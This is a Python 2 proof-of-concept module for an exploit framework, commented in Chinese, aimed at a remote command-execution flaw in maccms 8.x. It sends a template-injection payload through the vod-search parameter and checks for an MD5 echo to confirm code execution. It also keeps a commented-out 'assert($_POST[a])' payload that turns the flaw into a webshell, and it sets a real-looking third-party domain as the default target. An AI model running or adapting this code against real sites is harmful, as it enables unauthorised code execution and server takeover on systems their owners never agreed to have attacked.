#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import urllib2

#模块使用说明
docs = '''

#title                  :maccms命令执行漏洞
#description            :maccms命令执行漏洞
#author                 :mosin
#date                   :201701002
#version                :0.1
#notes                  :
#python_version         :2.7.5

'''

from modules.exploit import BGExploit



class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "maccms命令执行漏洞",  # 该POC的名称
            "product": "maccms8.x",  # 该POC所针对的应用名称,
            "product_version": "8.x",  # 应用的版本号
            "desc": '''
                苹果cms8.x存在命令执行漏洞,可直接写shell
                
            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: "www.wooyun.org"},  # 引用的url
                {self.ref.bugfrom: "www.wooyun.org"},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-09-2",  # 漏洞公开时间
            "create_date": "2017-09-2",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "www.cnstudy.net",
                "convert": self.convert.url_field,
                "desc": "目标URL",
                "Required":"no"
            },
            "port": {
                "default": "",
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":""
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": " ",
            "error": ""
        })


    def payload(self):
        #payload = r"index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}"
        payload = r"/index.php?m=vod-search&wd={if-A:print(md5(123))}{endif-A}"
        url = self.option.target['default']
        urls = url + payload
        #result_md5 = "202cb962ac59075b964b07152d234b70202cb962ac59075b964b07152d234b70202cb962ac59075b964b07152d234b70202cb962ac59075b964b07152d234b70﻿"
        result_md5 = "202cb962ac59075b964b07152d234b70﻿"
        #textmod = "a=phpinfo()"
        #header_dict = {
         #   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
         #   "Content-Type": "application/json"
          #  }

        res = urllib2.urlopen(urls).read()
        if result_md5 in res:
            self.result.status = True
        else:
            print u"[-] 不存在命令执行漏洞"


    def exploit(self):
        """
        攻击类型
        :return:
        """
        pass


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())
